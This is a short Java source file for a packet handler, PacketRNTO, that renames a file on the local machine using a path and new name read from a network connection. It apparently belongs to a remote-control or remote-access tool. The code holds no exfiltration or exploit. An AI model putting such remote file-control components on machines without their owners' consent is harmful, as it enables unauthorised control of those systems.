package com.redpois0n.packets.in;

import java.io.File;

import com.redpois0n.Connection;
import com.redpois0n.common.codec.Hex;


public class PacketRNTO extends AbstractIncomingPacket {
	
	public void read() throws Exception {
		String file = Connection.readLine();
		String newname = Connection.readLine();

		File f = new File(Hex.decode(file.substring(2, file.length())));
		File fto = new File(f.getAbsolutePath().replace(f.getName(), "") + newname);
		if (f.exists()) {
			f.renameTo(fto);
		}
	}

}
